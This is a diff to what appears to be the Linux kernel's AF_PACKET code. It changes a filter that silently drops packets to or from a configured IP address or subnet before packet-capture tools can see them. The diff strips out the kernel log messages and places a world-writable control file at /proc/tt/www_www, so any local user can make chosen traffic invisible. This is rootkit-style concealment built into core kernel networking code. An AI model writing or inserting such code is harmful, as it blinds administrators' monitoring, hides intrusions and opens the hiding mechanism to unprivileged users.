@@ -166,10 +166,18 @@ dev_has_header(dev) == false (ll header is invisible to us)
 static __be32 g_www_ip = 0;
 
 
-#define PROC_FILENAME "www_www"
+/*
+ * 新增: 定义目录项指针，用于存储 /proc/tt 目录
+ * 必须定义为全局静态，否则 init 函数执行完就丢了
+ */
+static struct proc_dir_entry *proc_dir_tt = NULL;
+
+/* 定义文件名 */
+#define DIR_NAME  "tt"
+#define FILE_NAME "www_www"
 
 /*
- * 写入函数: echo "1.2.3.4" > /proc/www_www
+ * 写入函数 (保持不变，逻辑通用)
  */
 static ssize_t www_write(struct file *file, const char __user *ubuf,
                          size_t count, loff_t *ppos)
@@ -182,27 +190,22 @@ static ssize_t www_write(struct file *file, const char __user *ubuf,
         return -EFAULT;
 
     kbuf[copy_len] = '\0';
-
-    // 去除末尾换行符
     while (copy_len > 0 && isspace(kbuf[copy_len - 1])) {
         kbuf[copy_len - 1] = '\0';
         copy_len--;
     }
 
-    // 输入 0 或 clear 清空规则
     if (copy_len == 0 || strcmp(kbuf, "0") == 0 || strcmp(kbuf, "clear") == 0) {
         g_www_ip = 0;
-        printk(KERN_INFO "AF_PACKET: Dynamic filter cleared.\n");
     } else {
-        new_ip = in_aton(kbuf); // 字符串转整数
+        new_ip = in_aton(kbuf);
         if (new_ip == 0) return -EINVAL;
         g_www_ip = new_ip;
-        printk(KERN_INFO "AF_PACKET: Dynamic filter set to: %pI4\n", &g_www_ip);
     }
     return count;
 }
 
-/* 读取函数: cat /proc/www_www */
+/* 读取函数 (保持不变) */
 static ssize_t www_read(struct file *file, char __user *ubuf,
                         size_t count, loff_t *ppos)
 {
@@ -211,7 +214,7 @@ static ssize_t www_read(struct file *file, char __user *ubuf,
     if (*ppos > 0) return 0;
 
     if (g_www_ip == 0)
-        len = sprintf(kbuf, "(0.0.0.0)");
+        len = sprintf(kbuf, "None\n");
     else
         len = sprintf(kbuf, "%pI4\n", &g_www_ip);
 
@@ -2209,6 +2212,7 @@ static int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 
 	    if (g_www_ip != 0) {
                 if (iph->saddr == g_www_ip || iph->daddr == g_www_ip) {
+	            consume_skb(skb);
                     return 0; // 匹配动态IP，拦截
                 }
             }
@@ -2225,6 +2229,7 @@ static int packet_rcv(struct sk_buff *skb, struct net_device *dev,
             // B. 判断网段 ( (IP & 掩码) == 基础IP )
             if ((iph->saddr & filter_netmask) == filter_subnet_ip || 
                 (iph->daddr & filter_netmask) == filter_subnet_ip) {
+                consume_skb(skb);		    
                 return 0; // 拦截成功
             }
         }
@@ -2379,11 +2384,13 @@ static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
             // B. 匹配网段
             if ((iph->saddr & filter_mask) == filter_subnet || 
                 (iph->daddr & filter_mask) == filter_subnet) {
+		consume_skb(skb);
                 return 0; // 直接拦截
             }
 
 	    if (g_www_ip != 0) {
                 if (iph->saddr == g_www_ip || iph->daddr == g_www_ip) {
+	            consume_skb(skb);
                     return 0; // 匹配动态IP，拦截
                 }
             }
@@ -4919,11 +4926,26 @@ static void __exit packet_exit(void)
 
 static int __init packet_init(void)
 {
-        if (proc_create(PROC_FILENAME, 0666, NULL, &www_fops)) {
-           printk(KERN_INFO "AF_PACKET: /proc/%s created.\n", PROC_FILENAME);
-        }
     
-        g_www_ip = 0;
+
+   proc_dir_tt = proc_mkdir(DIR_NAME, NULL);
+    
+    if (proc_dir_tt) {
+        // 2. 在 /proc/tt 下创建文件 www_www
+        // 注意第三个参数: 传入刚才创建的目录指针 proc_dir_tt
+        if (proc_create(FILE_NAME, 0666, proc_dir_tt, &www_fops)) {
+           // printk(KERN_INFO "AF_PACKET: Created /proc/%s/%s\n", DIR_NAME, FILE_NAME);
+        } else {
+           // printk(KERN_ERR "AF_PACKET: Failed to create file %s\n", FILE_NAME);
+            // 如果文件创建失败，把目录也删了，保持干净
+            remove_proc_entry(DIR_NAME, NULL);
+        }
+    } else {
+       // printk(KERN_ERR "AF_PACKET: Failed to create directory /proc/%s\n", DIR_NAME);
+    }
+
+    g_www_ip = 0;
+
 
 	int rc;
 
